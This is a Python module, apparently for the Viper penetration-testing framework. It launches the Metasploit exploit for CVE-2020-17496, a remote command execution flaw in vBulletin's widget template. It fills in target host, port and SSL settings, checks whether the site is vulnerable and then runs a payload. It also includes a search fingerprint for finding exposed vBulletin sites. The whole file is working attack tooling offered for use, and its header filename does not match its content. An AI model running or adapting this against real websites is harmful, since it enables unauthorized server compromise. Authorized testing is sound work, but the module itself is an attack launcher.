# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(BotMSFModule):
    NAME = "vbulletin widget模板命令执行"
    DESC = "模块使用CVE-2020-17496攻击选择的vbulletin网站.\n" \
           "建议选择php类型的payload"
    MODULETYPE = TAG2CH.Bot_MSF_Exp
    REFERENCES = ["https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/"]
    AUTHOR = "Viper"
    SEARCH = ' icon_hash="-601665621" '
    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, ip, port, protocol, custom_param):
        super().__init__(ip, port, protocol, custom_param)
        self.type = "exploit"
        self.mname = "multi/http/vbulletin_widget_template_rce_api"

    def check(self):
        """执行前的检查函数"""
        result = self.set_payload_by_handler()
        if result is not True:
            return False, "无法解析Handler,请选择正确的监听"
        else:
            if self._port == 443:
                self.set_option("SSL", True)
            else:
                self.set_option("SSL", False)
            self.set_option("RHOSTS", self._ip)
            self.set_option("RPORT", self._port)
            return True, ""

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_good("检测完成,检测到网站存在CVE-2020-17496漏洞,执行payload")
        else:
            self.log_error("网站不存在漏洞")
